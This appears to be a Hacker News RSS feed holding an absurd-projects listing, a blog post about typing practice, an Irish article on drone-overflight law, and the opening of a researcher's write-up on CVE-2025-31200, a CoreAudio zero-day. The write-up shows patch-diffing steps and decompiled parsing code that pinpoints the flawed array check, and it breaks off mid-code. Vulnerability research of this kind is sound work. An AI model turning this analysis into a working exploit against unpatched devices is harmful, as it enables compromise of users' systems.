After all, Earth can be a bit of a maze, and we want to make sure our extraterrestrial guests have all the insider tips and tricks they need to navigate with ease and enjoy their cosmic vacation to the fullest!
</p><p><span>Absurd Nr.16
</span></p>
<br>
</div>
<br>
	
	
	
	
	
	
	
										  <div>
<p><a href="https://absurd.website/puzzle-solvers-agency" target="_blank"><img src="https://absurd.website/thumb/puzzle-solvers-agency-absurd.png" loading="lazy"></a></p><h2><a href="https://absurd.website/puzzle-solvers-agency" target="_blank">Puzzle Solvers Agency</a></h2><p>
Having trouble with a jigsaw puzzle, Lego set, game, or anything tricky?
Just send it to us, and we'll solve it for you!
We're the first company that specializes in helping with puzzles and games.
</p><p><span>Absurd Nr.15
</span></p>
<br>
</div>
<br>
	
	
	
									  
<br>
	
	
								  
<br>
	
	
							  
<br>
	
	
	
	
						  
<br>


					  <div>
<p><a href="https://absurd.website/trip-to-mars/" target="_blank"><img src="https://absurd.website/thumb/flight-simulator.png" loading="lazy"></a></p><h2><a href="https://absurd.website/trip-to-mars/" target="_blank">Trip to Mars</a></h2><p>
Welcome to the first real-time spaceflight simulator game!<br>
You will need seven months (210 days) to complete it!</p>
<p><b>
‚≠ê SEEN ON:</b> <a href="https://youtube.com/watch?v=otJbOn672iE&amp;t=811s" target="_blank">Trilzo</a> ‚≠ê
</p><p><span>Absurd Nr.10
</span></p>
<br>
</div>
<br>
	
				  <div>
<p><a href="https://absurd.website/slow-delivery-service" target="_blank"><img src="https://absurd.website/thumb/slow-delivery-service.png" loading="lazy"></a></p><h2><a href="https://absurd.website/slow-delivery-service" target="_blank">Slow Delivery Service</a></h2><p>
Do you love slow food, slow traveling, slow architecture, and slow living?<br>
Now It's time for Slow Delivery!
</p><p><span>Absurd Nr.09
</span></p>
<br>
</div>
<br>
	
			  
<br>
	
		  
<br>



	
	  <div>
<p><a href="https://absurd.website/video-battle/" target="_blank"><img src="https://absurd.website/thumb/synchronic-video-battle.png" loading="lazy"></a></p><h2><a href="https://absurd.website/video-battle/" target="_blank">Synchronic Video Battle</a></h2><p>
Meat Eater vs Vegetarian, Trump vs Kanye West, Robots vs Humans... Watch synchronic videos and vote!
</p><p><span>Absurd Nr.06
</span></p>
<br>
</div>
<br>
	
	
	
  <div>
<p><a href="https://absurd.website/eyes-dating-site" target="_blank"><img src="https://absurd.website/thumb/Eyes-Dating-Site.png" loading="lazy"></a></p><h2><a href="https://absurd.website/eyes-dating-site" target="_blank">Eyes Dating Site</a></h2><p>
According to researchers, staring into someone's eyes can make you fall in love! <br>
This is a dating site for eyes.<br>
No faces, no bodies, no bla bla bla profile texts.
</p><p><span>Absurd Nr.05
</span></p>
<br>
</div>
<br>


  
<br>


  
<br>






<div>
<p><a href="https://absurd.website/dark-mandala/" target="_blank"><img src="https://absurd.website/thumb/Dark-Mandala-Adult-Coloring-Pages.png" loading="lazy"></a></p><h2><a href="https://absurd.website/dark-mandala/" target="_blank">Dark Mandala</a></h2><p>
Color by number coloring book with one color.<br>
There is only one color, and it is a BLACK!</p><p><span>Absurd Nr.02
</span></p>
<br>

</div>
<br>



  


<br>
<a name="subscribe"></a>
  <p><a href="https://www.facebook.com/absurd.website" target="_blank"><img src="https://absurd.website/thumb/fb.png"></a> &nbsp;
<a href="https://www.instagram.com/absurd.website" target="_blank"><img src="https://absurd.website/thumb/insta.png"></a> &nbsp;  
<a href="https://twitter.com/AbsurdWebsite" target="_blank"><img src="https://absurd.website/thumb/twitter.png"></a> &nbsp;  
<a href="https://www.tiktok.com/@absurd.website" target="_blank"><img src="https://absurd.website/tiktok.png"></a> &nbsp;  
<a href="https://www.reddit.com/r/absurd_website/" target="_blank"><img src="https://absurd.website/reddit.png"></a>

<br>
Subscribe here to get monthly updates with new absurd projects!<br>
üëâ <a href="http://eepurl.com/hft-U9">Subscribe</a><br>
Expect weird stuff. Just once a month.

  </p>
  <br>

















</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Typing 118 WPM broke my brain in the right ways (148 pts)]]></title>
            <link>http://balaji-amg.surge.sh/blog/typing-118-wpm-brain-rewiring</link>
            <guid>44162327</guid>
            <pubDate>Mon, 02 Jun 2025 19:48:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://balaji-amg.surge.sh/blog/typing-118-wpm-brain-rewiring">http://balaji-amg.surge.sh/blog/typing-118-wpm-brain-rewiring</a>, See on <a href="https://news.ycombinator.com/item?id=44162327">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>Typing became my therapy. Not even kidding.</p>

    <p>Started at 60 WPM, felt like dragging my feet through mud every time I had to write code comments or documentation. Now? 118 WPM. No home row bullshit. No "proper finger placement." Just pure, chaotic rhythm. <a href="https://www.keybr.com/profile/h2mhhp0" target="_blank">Proof here</a> because I know you don't believe me.</p>

    <h2>My Daily Brain Reset Ritual</h2>

    <p>Every morning, before I even think about opening VS Code, before Slack starts destroying my soul, before the daily standup where we pretend we know what we're doing, I just <strong>type</strong>. Five minutes. That's it.</p>

    <p>It's like meditation but actually useful. Resets my brain, calms the static from yesterday's debugging session, and gets me in the zone. Way better than staring at my ceiling wondering why I chose this career.</p>

    <h2>Speed is Useless if You're Wrong</h2>

    <p>Here's the thing that took me way too long to figure out: rushing makes everything worse. Every time I tried to go fast, I'd mess up, backspace like crazy, and end up slower than when I started. Classic developer move, honestly.</p>

    <p>So I slowed down. Focused on hitting every key right. And boom ‚Äî speed just... happened. 90 WPM, 100 WPM, 118 WPM. All came when I was hitting 100% accuracy consistently.</p>

    <p><img src="http://balaji-amg.surge.sh/blogs/top-speed.png" alt="top-speed"></p><p>It's like debugging. You can't just randomly change stuff and hope it works. You gotta be methodical, get it right, then optimize. Same energy.</p>

    <p>Some words still absolutely wreck me though. "Obviously" keeps coming out as "obviousily" and I want to throw my keyboard every time. So now I just slow down for those demon words and blast through the rest. Strategic speed management or whatever.</p>

    <h2>Screw the Rules, Find Your Flow</h2>

    <p>Plot twist: I don't type "correctly" at all. My fingers just go wherever they want. It's like anarchist typing. My left pinky probably hasn't touched the 'A' key in months, but somehow I'm still in the 99.5 percentile.</p>

    <p>Turns out the "proper way" is just a suggestion. Like following PEP 8 or using semicolons in JavaScript. Sure, it's nice, but if your way works better, who cares?</p>

    <h2>When Your Brain is Fried</h2>

    <p>You know those days when you've been staring at the same bug for 3 hours and your brain feels like mush? Or when you've been doomscrolling Twitter instead of working and feel dead inside?</p>

    <p>That's when I open <a href="https://www.keybr.com/" target="_blank">Keybr</a>. It's like going to the gym but for your neurons. Good typing session = instant mood boost. Small win = dopamine hit. Better than coffee, honestly.</p>

    <p>Sometimes I use it as a break between coding sessions. Brain getting foggy? Type for 2 minutes. Stuck on a problem? Type. Deployment failed and you want to quit tech forever? You guessed it.</p>

    <h2>The Inevitable Skill Issue Moments</h2>

    <p>Not gonna lie, there were weeks where I absolutely tanked. Bad accuracy, slow speeds, feeling like I'd forgotten how to use a keyboard. Classic imposter syndrome but for typing.</p>

    <p>"Maybe I'm not actually good at this. Maybe 118 WPM was just a fluke. Maybe I should just stick to hunt-and-peck like a normal person."</p>

    <p>But then I'd bounce back. Always. Usually harder and faster than before. It's like when you're stuck on a bug for days and then suddenly the solution is obvious. The struggle makes the breakthrough better.</p>

    <p><img src="http://balaji-amg.surge.sh/blogs/typing-profile.png" alt="typing-profile"></p><h2>The Numbers Don't Lie</h2>

    <p>Been doing this for over a year now. 7,000+ lessons completed on Keybr. My brain genuinely feels different. Not just the typing speed, but focus, discipline, the ability to sit down and just <em>do the thing</em>.</p>

    <p>It's one of those weird habits that seems pointless but somehow fixes everything else. Like how learning vim makes you better at thinking about text editing, or how writing tests makes you better at designing APIs.</p>

    <p><strong>Real talk:</strong> This stupid little habit has probably made me a better developer. Faster at writing code, better at documentation, less frustrated when I have to type out long variable names or commit messages.</p>

    <p>Plus, there's something deeply satisfying about watching words appear on screen at the speed of thought. It's like having a direct brain-to-computer interface, but with more finger movement.</p>

    <p>So yeah. Typing fixed my brain. And probably made me less annoying in code reviews because I can actually write coherent comments now.</p>

    <p>End of story. Now go find your own weird productivity hack that makes no sense but somehow works.</p>


  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Can I stop drone delivery companies flying over my property? (113 pts)]]></title>
            <link>https://www.rte.ie/brainstorm/2025/0602/1481005-drone-delivery-companies-property-legal-rights-airspace/</link>
            <guid>44162042</guid>
            <pubDate>Mon, 02 Jun 2025 19:15:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.rte.ie/brainstorm/2025/0602/1481005-drone-delivery-companies-property-legal-rights-airspace/">https://www.rte.ie/brainstorm/2025/0602/1481005-drone-delivery-companies-property-legal-rights-airspace/</a>, See on <a href="https://news.ycombinator.com/item?id=44162042">Hacker News</a></p>
<div id="readability-page-1" class="page"><section itemprop="articleBody" data-epic-field="content">
                        <p><b>Analysis: The legal landscape surrounding the use of drones is currently far from clear and many practical questions remain unanswered.</b></p>
<p>Once only found in the realm of science fiction movies, drone delivery services are now an increasingly obvious part of our urban landscape. Service providers such as <a href="https://www.manna.aero/" target="_blank">Manna</a> and <a href="https://wing.com/" target="_blank">Wing</a> (the latter operated by <a href="http://google.com/">Google's</a> parent company <a href="https://en.wikipedia.org/wiki/Alphabet_Inc." target="_blank">Alphabet</a>) are now delivering an ever growing range of items to consumers and corporate entities, particularly across the Dublin region: from <a href="https://www.rte.ie/radio/radio1/clips/22230075/">coffee and pastries</a> to <a href="https://www.rte.ie/news/ireland/2024/0702/1457657-drone-delivery-hospitals/)">medical supplies and devices</a>.</p>
<p alt="Drone Delivery" data-description="Bobby Healy from Manna Aero drone deliveries on delivering flat whites and pastries to the gardens of Balbriggan and his next move into drone deliveries in America. " data-embed="rte-player" data-id="22230075" data-ot-category="C0004" data-title="Bobby Healy from Manna Aero drone deliveries on delivering flat whites and pastries to the gardens of Balbriggan and his next move into drone deliveries in America. "><span><span>We need your consent to load this rte-player content</span><span>We use rte-player to manage extra content that can set cookies on your device and collect data about your activity. Please review their details and accept them to load the content.</span>Manage Preferences</span></p>
<p><i><b>From RT√â Radio 1's Brendan O'Connor Show, Bobby Healy from Manna Aero drone deliveries on delivering fast food around Dublin</b></i></p>
<p>But as the phenomenon of drone deliveries increases, the concerns of home owners and residents negatively impacted by the rapid rise in the number of flyovers have attracted ever greater media attention. In recent weeks, the <a href="https://aaiu.ie/" target="_blank">Air Accident Investigation Unit</a> reported on an <a href="https://www.rte.ie/news/dublin/2024/1108/1479951-drone-injury-dublin/">incident</a> in Dublin in 2022 where a man was struck by a propeller blade which had separated from a drone and had fallen on him as he mowed the lawn. Fears in relation to the potential for privacy breaches have also generated considerable attention as have complaints in relation to the noise generated by the whirring of the drones themselves.</p>
<p>Unfortunately, the legal landscape surrounding the use of drones is far from clear. While to some extent drone usage is regulated at both an Irish and European level ‚Äì with the <a href="https://www.iaa.ie/" target="_blank">Irish Aviation Authority</a> playing an important role in this regard ‚Äì many practical legal questions remain unanswered. Can a home owner, for instance, prevent drone delivery companies from flying over their property? Or can they sue for trespass where flyovers do occur in the airspace over their home?</p>
<p alt="Drones being used to deliver medical supplies to private hospitals" data-description="Tom Kuhn from Wing spoke to us from Ohio about how it works" data-embed="rte-player" data-id="22412401" data-ot-category="C0004" data-title="Tom Kuhn from Wing spoke to us from Ohio about how it works"><span><span>We need your consent to load this rte-player content</span><span>We use rte-player to manage extra content that can set cookies on your device and collect data about your activity. Please review their details and accept them to load the content.</span>Manage Preferences</span></p>
<p><i><b>From RT√â Radio 1's News at One, Tom Kuhn from Wing on how drones are being used to deliver medical supplies to private hospitals</b></i></p>
<p>In the past, it was <a href="https://en.wikipedia.org/wiki/Cuius_est_solum,_eius_est_usque_ad_coelum_et_ad_inferos" target="_blank">said</a> that the owner of land owned everything reaching up to the heavens and down to hell. With the arrival of modern aviation, this understanding of the scope of property ownership shifted. Conscious of the need to balance, on one hand, the rights of landowners to enjoy the use of their land, with, on the other hand, the rights of the general public to take advantage of air travel, the courts in England <a href="https://en.wikipedia.org/wiki/Bernstein_of_Leigh_v_Skyviews_%26_General_Ltd" target="_blank">determined</a> that the ownership of land carried with it rights in air space above the land only to such height as is 'necessary for the ordinary use and enjoyment‚Äô of it and the structures on it. This approach was reflected in Irish law via section 55 of the <a href="https://www.irishstatutebook.ie/eli/1936/act/40">Air Navigation and Transport Act 1936</a> which states that a landowner may not sue for trespass or<b><i> </i></b>nuisance where aircraft fly over property at a height which is ‚Äòreasonable‚Äô having regard to wind, weather and all the circumstances.</p>
<p>However, these statements of law provide little guidance in answering the questions now increasingly raised with the rapid growth in the use of drone technology: what is ‚Äòreasonable‚Äô or ‚Äònecessary for the ordinary use and enjoyment‚Äô of the land is anyone‚Äôs guess.</p>
<p>Ireland is not alone in having as yet failed to clarify the law in this area. Almost all jurisdictions are grappling with similar issues. Research from America, for example, also speaks to the confusion existing there as to the scope of landowners‚Äô rights to prevent or exclude drones from flying over their property. Influential brands including <a href="http://amazon.com/">Amazon</a> and <a href="http://walmart.com/">Walmart</a> have met tough opposition in seeking to develop policies facilitating the use of commercial drone delivery services.</p>
<p alt="Dublin City Council launching Dublin Drone Innovation Partnership toda..." data-description="Jamie Cudden, Smart City Programme Manager, Dublin City Council, discusses the launch of the Drone Innovation Project." data-embed="rte-player" data-id="22445617" data-ot-category="C0004" data-title="Jamie Cudden, Smart City Programme Manager, Dublin City Council, discusses the launch of the Drone Innovation Project."><span><span>We need your consent to load this rte-player content</span><span>We use rte-player to manage extra content that can set cookies on your device and collect data about your activity. Please review their details and accept them to load the content.</span>Manage Preferences</span></p>
<p><i><b>From RT√â Radio 1's Morning Ireland, Jamie Cudden from Dublin City Council on the council's launch of the Drone Innovation Project</b></i></p>
<p>Yet, necessity is the mother of invention and innovative solutions are being proposed. Rather than downgrading the rights of property owners in relation to the air space over their land, the most viable solution actually appears to be the opposite. The simplest and fairest method of introducing clarity in this area for all concerned ‚Äì home owners, residents and drone delivery companies alike ‚Äì is arguably to develop legislation clearly defining the height to which private property ownership extends into the air space.</p>
<p>In this model, and conscious of the need to reduce the potential nuisance caused by drones, it could be stated that home owners‚Äô rights include the air space up to 60 or 70 metres above their property (delivery drones currently operate between 50-65 metres). Some homeowners or residents will be happy to let the air space over their property be used, whether in return for payment or otherwise. Where this happens, it could allow for the emergence of digital air space sharing platforms (like <a href="https://www.airbnb.ie/" target="_blank">AirBnB</a>) to facilitate temporary flight paths for drone deliveries. Where homeowners or residents do not consent to such flyovers, an air corridor designated for drone use over the 60 or 70 metre limit would have to be used.</p>
<blockquote>
<p>It is essential that issues regarding the ownership of lower altitude airspace are addressed as a matter of priority</p>
</blockquote>
<p>By forcing drone delivery companies, in particular, to either acquire the consent of landowners if they wish to fly below this threshold, or operate in a corridor above it, some of the heat may be taken out of the debate. While this proposal appears to be the strongest solution yet developed, it is not without its flaws. At a practical level, it would, for one, be hard to prove that a drone was flying below the 60 or 70 meter limit and was trespassing. However, technology and data solutions could surely be developed or repurposed to mitigate these risks through the sharing of flight logs or other information captured in flight.</p>
<p>Ultimately, the status quo appears unsustainable and solutions, whether those set out here or otherwise, will have to be found. In the interest of all concerned, it is essential that issues regarding the ownership of lower altitude airspace are addressed as a matter of priority.</p>
<h3><b>Follow RT√â Brainstorm on <a href="https://www.whatsapp.com/channel/0029VaJ6ugQ1HsptikZkfS1f" target="_blank">WhatsApp</a> and <a href="https://www.instagram.com/rte_brainstorm" target="_blank">Instagram</a> for more stories and updates</b></h3>
<hr>
<p><b>The views expressed here are those of the author and do not represent or reflect the views of RT√â</b></p>
<hr>
                    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CVE 2025 31200 (120 pts)]]></title>
            <link>https://blog.noahhw.dev/posts/cve-2025-31200/</link>
            <guid>44161894</guid>
            <pubDate>Mon, 02 Jun 2025 18:58:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.noahhw.dev/posts/cve-2025-31200/">https://blog.noahhw.dev/posts/cve-2025-31200/</a>, See on <a href="https://news.ycombinator.com/item?id=44161894">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  <h2 id="background">Background</h2>
<p>On April 16, 2025, Apple released a patch for a bug in CoreAudio which they said was <a href="https://support.apple.com/en-us/122282">‚ÄúActively exploited in the wild.‚Äù</a> This flew under the radar a bit. <a href="https://blog.epsilon-sec.com/cve-2025-31201-rpac.html">Epsilon‚Äôs blog</a> has a great writeup of the other bug that was presumably exploited in this chain: a bug in RPAC. The only thing out there that I am aware of about the CoreAudio side of the bug is a video by Billy Ellis (it‚Äôs great. I‚Äôm featured. You should watch‚Ä¶you‚Äôre probably here from that anyways). As he mentioned in the video, ‚ÄúAnother security researcher by the name of ‚ÄòNoah‚Äô was able to <em>tweak</em> the values such that when it was played on MacOS, it actually did lead to a crash.‚Äù I think it‚Äôs still worth it to write about that ‚Äòtweaking‚Äô process in more detail.</p>
<p>I had just finished another project and ended up on a <a href="https://docs.google.com/spreadsheets/u/0/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit">spreadsheet</a> maintained by Project Zero which tracks zero days that have been actively exploited in the wild. It just so happened that <em>that</em> day there had been another addition: CVE-2025-31200. I couldn‚Äôt find any writeups on it, or really any information other than the fact that it was a ‚Äúmemory corruption in CoreAudio‚Äù so I decided to have a look myself. How hard could it be?</p>
<p>There was a bit of a rocky start. I don‚Äôt have IDA Pro so my options for binary diffing are limited. Billy mentions Diaphora in his video, and that does seem like the industry standard. Apparently it also has a Ghidra plugin, but I don‚Äôt want that Java stink on my laptop. So I had to do things the old-fashioned way. Luckily there is an awesome tool called ipsw maintained by Blacktop. One of its primary use cases is diffing between different versions of iOS. There is even a <a href="https://github.com/blacktop/ipsw-diffs">repo</a> where markdown versions of the diffs are posted, so it was trivial for me to have a look at that. There were a relatively small number of updates, and it was clear that the ones related to this bug were in AudioCodecs.</p>

<p>A 20 byte increase in the __text section is exactly the kind of change you‚Äôd expect from a memory corruption like this, so I thought I would crack open the new and the old versions in Binary Ninja and the change would be obvious. First however, I had to actually do the binary diffing. Ipsw-diff is great for basic info like this, but it‚Äôs not a disassembler, so it doesn‚Äôt show any code-level changes. In order to do the actual diffing I used radiff2 from Radare2.</p>
<p>I fully expected this binary to be a part of the Dyld shared cache. However, if you pay close attention to the path from ipsw-diff, you can see that it isn‚Äôt. It lives in <code>/System/Library/Components/AudioCodecs.component/</code>. That‚Äôs <em>Components</em> not <em>Frameworks.</em> I don‚Äôt know what the difference between them is. Regardless, AudioCodecs on macOS is not part of the shared cache. I collected both the old and the new binaries and ran them through radiff2.</p>
<h2 id="the-diff">The Diff</h2>
<p>Radiff2 spit out a few candidate functions for me to study more closely. Most of them just had compiler entropy differences (think registers shifting around) or different addresses since the text section had shifted. Luckily, one function stuck out as the obvious candidate: <code>apac::hoa::CodecConfig::Deserialize(this, bitStreamReader)</code>, presumably a C++ (you can tell by the ‚Äò::‚Äô) member method of the CodecConfig class. There were a number of logical changes, a new error message, and a new check all clearly visible at the bottom of the method. I thought that the bug would now be trivial to spot since the changes seemed self-contained enough, and often it‚Äôs the followup‚Äînot the actual exploit primitive itself‚Äîthat takes most of the ingenuity.</p>
<p>I stared for a while at the difference between the old and new Deserialize method. I even took the time to manually copy and paste them out into VSCode and use its built-in diffing functionality. I could tell that a lot of it was the same. The method consists in a series of reads from a bitstream, each having their own failure cases and control flow. It looks like a relatively typical parsing method. The high level flow is a series of blocks that look like this:</p>
<ol>
<li>Read some bits from the stream with the bitStreamReader</li>
<li>Check some error conditions</li>
<li>If failure then log failure and exit</li>
<li>If success then advance the pointer and continue to the next block</li>
</ol>
<p>The section that differed was the final read from the stream. In it there were repeated snippets like this meant to read in the length of some array:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>// Access 
</span></span></span><span><span> 2</span><span><span></span><span>uint32_t</span> <span>*</span><span>section</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0x78</span><span>;</span>
</span></span><span><span> 3</span><span>
</span></span><span><span> 4</span><span><span>// Read the opcode stored at section[0]
</span></span></span><span><span> 5</span><span><span></span><span>uint32_t</span> <span>opcode</span> <span>=</span> <span>section</span><span>[</span><span>0</span><span>];</span>
</span></span><span><span> 6</span><span><span>int32_t</span>  <span>elementCount</span><span>;</span>
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span> 9</span><span>    <span>// If opcode == 0x10000, count all set-bits in the next 8 bytes of data
</span></span></span><span><span>10</span><span><span></span>    <span>// (i.e., the two uint32_t elements section[1] and section[2])
</span></span></span><span><span>11</span><span><span></span>    <span>uint8x8_t</span> <span>raw_bytes</span>     <span>=</span> <span>vld1_u8</span><span>((</span><span>uint8_t</span> <span>*</span><span>)</span><span>&amp;</span><span>section</span><span>[</span><span>1</span><span>]);</span> <span>// uint8x8_t is a NEON intrinsic vector type holding 8 unsigned 8-bit values
</span></span></span><span><span>12</span><span><span></span>    <span>uint8x8_t</span> <span>popcounts</span>     <span>=</span> <span>vcnt_u8</span><span>(</span><span>raw_bytes</span><span>);</span>
</span></span><span><span>13</span><span>    <span>uint64_t</span>  <span>total_bits</span>    <span>=</span> <span>vaddlv_u8</span><span>(</span><span>popcounts</span><span>);</span>
</span></span><span><span>14</span><span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>total_bits</span><span>;</span>
</span></span><span><span>15</span><span><span>}</span>
</span></span><span><span>16</span><span><span>else</span> <span>if</span> <span>(</span><span>opcode</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>17</span><span>    <span>// If opcode is nonzero, use its low 16 bits
</span></span></span><span><span>18</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)(</span><span>opcode</span> <span>&amp;</span> <span>0xFFFF</span><span>);</span>
</span></span><span><span>19</span><span><span>}</span>
</span></span><span><span>20</span><span><span>else</span> <span>{</span>
</span></span><span><span>21</span><span>    <span>// Otherwise, fall back to the third array element
</span></span></span><span><span>22</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>section</span><span>[</span><span>2</span><span>];</span>
</span></span><span><span>23</span><span><span>}</span>
</span></span><span><span>24</span><span><span>//do stuff with elementCount
</span></span></span></code></pre></div><p>Then, also common between them (within the differing sections) was a little floating point dance to compute the bit width of the array entries (bitWidth) that would later be read in from the stream.</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>v0_3</span> <span>=</span> <span>(</span><span>float</span><span>)</span><span>remappingEntries</span><span>;</span>
</span></span><span><span>2</span><span><span>int128_t</span> <span>v0_4</span><span>;</span>
</span></span><span><span>3</span><span><span>v0_4</span> <span>=</span> <span>(</span><span>double</span><span>)</span><span>_log2f</span><span>(</span><span>v0_3</span><span>);</span>
</span></span><span><span>4</span><span><span>v0_4</span> <span>=</span> <span>v0_4</span> <span>+</span> <span>-</span><span>0.0001</span><span>;</span>
</span></span><span><span>5</span><span><span>v0_4</span> <span>=</span> <span>(</span><span>float</span><span>)</span><span>v0_4</span><span>;</span>
</span></span><span><span>6</span><span><span>uint32_t</span> <span>bitWidth</span> <span>=</span> <span>vcvtps_u32_f32</span><span>(</span><span>v0_4</span><span>);</span></span></span></code></pre></div><p>Essentially <code>floor(log‚ÇÇ(elementCount))</code>.  In both versions there is some code that computes the size of an array. It uses the number of required elements, and the current size of the array:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>if</span> <span>(</span><span>elementCount</span> <span>&gt;</span> <span>currentSize</span><span>)</span> <span>{</span>
</span></span><span><span>2</span><span>	<span>resize</span><span>(</span><span>arr</span><span>,</span> <span>elementCount</span> <span>-</span> <span>currentSize</span><span>);</span>
</span></span><span><span>3</span><span><span>}</span>
</span></span><span><span>4</span><span><span>else</span> <span>if</span> <span>(</span><span>currentSize</span> <span>&gt;</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>5</span><span>	<span>current_arr_end_ptr</span> <span>-=</span> <span>(</span><span>currentSize</span> <span>-</span> <span>elementCount</span><span>)</span>
</span></span><span><span>6</span><span><span>}</span></span></span></code></pre></div><p>The rest of the respective final reads were different. In the old version, it uses the <code>elementCount</code>as computed above. In the new version it uses some field of the <code>this</code> pointer:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>uint64_t</span> <span>elementCount</span> <span>=</span> <span>(</span><span>uint64_t</span><span>)</span><span>*</span><span>(</span><span>uint32_t</span><span>*</span><span>)((</span><span>char</span><span>*</span><span>)</span><span>this</span> <span>+</span> <span>0x58</span><span>);</span></span></span></code></pre></div><p>This was an important clue. I figured if I just traced through the rest of the code, then there would be some write into the <code>elementCount</code>-sized array with a size check based on <code>this+0x58</code>, rather than <code>elementCount</code>. That would be the primitive. Here is the chunk of the code that reads from the stream and writes in to the array:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>size_t</span>     <span>index</span>       <span>=</span> <span>0</span><span>;</span>
</span></span><span><span> 2</span><span><span>uint8_t</span>    <span>lastSymbol</span><span>;</span>
</span></span><span><span> 3</span><span><span>int32_t</span>    <span>limit</span><span>;</span>
</span></span><span><span> 4</span><span>
</span></span><span><span> 5</span><span><span>do</span> <span>{</span>
</span></span><span><span> 6</span><span>    <span>// Same exact section as before: computing how many entries we need in our array
</span></span></span><span><span> 7</span><span><span></span>    <span>uint32_t</span> <span>*</span><span>section</span> <span>=</span> <span>this</span><span>-&gt;</span><span>off_0x78</span><span>;</span>
</span></span><span><span> 8</span><span>    <span>uint32_t</span>  <span>opcode</span>  <span>=</span> <span>section</span><span>[</span><span>0</span><span>];</span>
</span></span><span><span> 9</span><span>    <span>int32_t</span>   <span>elementCount</span><span>;</span>
</span></span><span><span>10</span><span>    
</span></span><span><span>11</span><span>    <span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span>12</span><span>		    <span>uint8x8_t</span> <span>raw_bytes</span>     <span>=</span> <span>vld1_u8</span><span>((</span><span>uint8_t</span> <span>*</span><span>)</span><span>&amp;</span><span>section</span><span>[</span><span>1</span><span>]);</span> 
</span></span><span><span>13</span><span>		    <span>uint8x8_t</span> <span>popcounts</span>     <span>=</span> <span>vcnt_u8</span><span>(</span><span>raw_bytes</span><span>);</span>
</span></span><span><span>14</span><span>		    <span>uint64_t</span>  <span>total_bits</span>    <span>=</span> <span>vaddlv_u8</span><span>(</span><span>popcounts</span><span>);</span>
</span></span><span><span>15</span><span>		    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>total_bits</span><span>;</span>
</span></span><span><span>16</span><span>    <span>}</span>
</span></span><span><span>17</span><span>    <span>else</span> <span>if</span> <span>(</span><span>opcode</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>18</span><span>        <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)(</span><span>opcode</span> <span>&amp;</span> <span>0xFFFF</span><span>);</span>
</span></span><span><span>19</span><span>    <span>}</span>
</span></span><span><span>20</span><span>    <span>else</span> <span>{</span>
</span></span><span><span>21</span><span>        <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>section</span><span>[</span><span>2</span><span>];</span>
</span></span><span><span>22</span><span>    <span>}</span>
</span></span><span><span>23</span><span>    <span>// Check #1 if index &gt;= expected elements
</span></span></span><span><span>24</span><span><span></span>    <span>if</span> <span>((</span><span>uint64_t</span><span>)</span><span>index</span> <span>&gt;=</span> <span>(</span><span>uint64_t</span><span>)</span><span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>25</span><span>        <span>result</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>26</span><span>        <span>goto</span> <span>loop_end</span><span>;</span>
</span></span><span><span>27</span><span>    <span>}</span>
</span></span><span><span>28</span><span>
</span></span><span><span>29</span><span>    <span>uint32_t</span> <span>BitWidth</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xD8</span><span>;</span>
</span></span><span><span>30</span><span>    <span>BitstreamReader</span> <span>*</span><span>reader</span> <span>=</span> <span>TBitstreamReader</span><span>*</span><span>;</span>
</span></span><span><span>31</span><span>    <span>uint32_t</span> <span>value</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>32</span><span>
</span></span><span><span>33</span><span>    <span>if</span> <span>(</span><span>BitWidth</span> <span>&lt;=</span> <span>32</span><span>)</span> <span>{</span>
</span></span><span><span>34</span><span>        <span>uint32_t</span> <span>cache</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>cacheWord</span><span>;</span>
</span></span><span><span>35</span><span>        <span>uint32_t</span> <span>bitOffset</span>   <span>=</span> <span>reader</span><span>-&gt;</span><span>bitOffset</span><span>;</span>
</span></span><span><span>36</span><span>
</span></span><span><span>37</span><span>        <span>if</span> <span>(</span><span>bitOffset</span> <span>&gt;=</span> <span>bitWidth</span><span>)</span> <span>{</span> <span>// More bits in cache than the size of an element
</span></span></span><span><span>38</span><span><span></span>            <span>value</span> <span>=</span> <span>cache</span> <span>&lt;&lt;</span> <span>BitWidth</span><span>;</span>
</span></span><span><span>39</span><span>            <span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>=</span> <span>bitOffset</span> <span>-</span> <span>BitWidth</span><span>;</span>
</span></span><span><span>40</span><span>        <span>}</span>
</span></span><span><span>41</span><span>        <span>else</span> <span>{</span>
</span></span><span><span>42</span><span>        	  <span>// Refill the cache and do some housekeeping
